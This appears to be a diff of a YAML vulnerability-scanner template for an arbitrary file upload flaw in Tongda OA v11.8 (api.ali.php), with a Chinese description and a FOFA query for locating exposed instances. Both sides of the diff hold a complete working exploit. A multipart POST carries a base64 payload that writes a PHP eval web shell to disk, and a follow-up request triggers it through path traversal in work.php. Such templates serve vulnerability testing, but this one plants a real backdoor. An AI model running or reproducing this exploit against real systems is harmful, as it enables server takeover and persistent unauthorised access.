@@ -1,41 +1,44 @@
+expression: r0() && r1()
 id: tongda-oa-api-ali-upload
-
 info:
-  name: 通达OA v11.8 api.ali.php任意文件上传漏洞
   author: daffainfo
+  description: "\u901A\u8FBEOA\uFF08OfficeAnywhere\u7F51\u7EDC\u667A\u80FD\u529E\u516C\
+    \u7CFB\u7EDF\uFF09\u662F\u7531\u5317\u4EAC\u901A\u8FBE\u4FE1\u79D1\u79D1\u6280\
+    \u6709\u9650\u516C\u53F8\u81EA\u4E3B\u7814\u53D1\u7684\u534F\u540C\u529E\u516C\
+    \u81EA\u52A8\u5316\u8F6F\u4EF6\uFF0C\u662F\u4E0E\u4E2D\u56FD\u4F01\u4E1A\u7BA1\
+    \u7406\u5B9E\u8DF5\u76F8\u7ED3\u5408\u5F62\u6210\u7684\u7EFC\u5408\u7BA1\u7406\
+    \u529E\u516C\u5E73\u53F0\u3002\u901A\u8FBE\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\
+    \u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u6307\
+    \u5B9A\u63A5\u53E3\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\uFF0C\u83B7\u53D6\u670D\
+    \u52A1\u5668\u7BA1\u7406\u6743\u9650\u3002\nfofa-query: app=\"TDXK-\u901A\u8FBE\
+    OA\"\n"
+  name: "\u901A\u8FBEOA v11.8 api.ali.php\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\
+    \u6D1E"
+  reference:
+  - https://mp.weixin.qq.com/s/G6tSTQGl31xYgpMQnNx0dw
   severity: critical
   verified: true
-  description: |
-    通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达存在任意文件上传漏洞，攻击者可以通过指定接口上传任意文件，获取服务器管理权限。
-    fofa-query: app="TDXK-通达OA"
-  reference:
-    - https://mp.weixin.qq.com/s/G6tSTQGl31xYgpMQnNx0dw
-    
-
+rules:
+  r0:
+    expression: response.status == 200
+    request:
+      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"file\"; filename=\"fb6790f7.json\"\r\nContent-Type: application/octet-stream\r\
+        \n\r\n{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY3LnBocCcsJzw/cGhwIGV2YWwoJF9QT1NUWyJwYXNzIl0pOycpOw==\"\
+        ,\"dataAnalysis\":\"{\"a\":\"\u9326',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"\
+        }\"}\r\n--WebKitFormBoundary{{rboundary}}--"
+      headers:
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+      method: POST
+      path: /mobile/api/api.ali.php
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b'+OK')
+    request:
+      headers:
+        Cookie: PHPSESSID=8qabkksg1gs817uq8m5rlt2ja5; KEY_RANDOMDATA=18588
+      method: GET
+      path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{pathname}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f7
 set:
   hosturl: request.url
   pathname: shortyear(0) + month(0)
   rboundary: randomLowercase(8)
-rules:
-  r0:
-    request:
-      method: POST
-      path: /mobile/api/api.ali.php
-      headers:
-        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
-      body: "\
-         --WebKitFormBoundary{{rboundary}}\r\n\
-         Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f7.json\"\r\n\
-         Content-Type: application/octet-stream\r\n\
-         \r\n\
-         {\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY3LnBocCcsJzw/cGhwIGV2YWwoJF9QT1NUWyJwYXNzIl0pOycpOw==\",\"dataAnalysis\":\"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}\"}\r\n\
-         --WebKitFormBoundary{{rboundary}}--"
-    expression: response.status == 200
-  r1:
-    request:
-      method: GET
-      path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{pathname}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f7
-      headers:
-          Cookie: PHPSESSID=8qabkksg1gs817uq8m5rlt2ja5; KEY_RANDOMDATA=18588
-    expression: response.status == 200 && response.body.bcontains(b'+OK')
-expression: r0() && r1()
